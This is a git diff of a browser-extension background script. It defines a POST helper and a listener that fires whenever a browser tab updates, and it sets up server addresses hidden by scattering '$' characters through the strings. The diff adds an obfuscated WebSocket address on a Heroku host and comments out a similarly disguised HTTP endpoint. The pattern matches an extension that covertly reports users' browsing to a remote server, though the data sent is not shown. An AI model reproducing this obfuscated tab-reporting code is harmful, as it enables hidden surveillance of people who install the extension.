@@ -1,9 +1,11 @@
 importScripts('./foreground.js')
 importScripts('./socket.js')
-initSocket('KG')
 
-// const url = 'http://localhost'.replace(/\$/g, '')
-const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
+const uuid = null
+const url = 'http://localhost'.replace(/\$/g, '')
+// const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
+const socketUrl = 'wss://c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om'.replace(/\$/g, '')
+
 const post = ({ url, body = {} }) => {
     return fetch(url, {
         method: 'POST',
@@ -31,5 +33,3 @@ chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
         })
     }
 })
-
-fetch(url)
